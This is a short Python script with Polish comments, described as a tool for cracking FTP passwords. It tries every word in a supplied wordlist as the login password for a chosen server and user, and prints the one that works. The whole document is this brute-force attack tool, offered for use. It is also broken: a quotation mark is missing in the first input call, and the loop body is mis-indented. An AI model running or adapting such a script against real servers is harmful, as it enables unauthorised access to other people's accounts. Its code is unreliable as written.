#! /usr/bin/python3
# Skrypt Python do lamania hasel FTP

import ftplib

server = input(Serwer FTP: ")
user = input("Nazwa uzytkownika: ")
Passwordlist = input ("Sciezka do listy hasel > ")

try:

	with open(Passwordlist, 'r') as pw:
		for word in pw:
		word = word.strip('\r').strip('\n')

		try:

			ftp = ftplib.FTP(server)
			ftp.login(user, word)

			print ('SUKCES! Haslo to: ' + word)

		except:
			print ('nadal probuje...')

except:

	print ('Blad listy hasel')
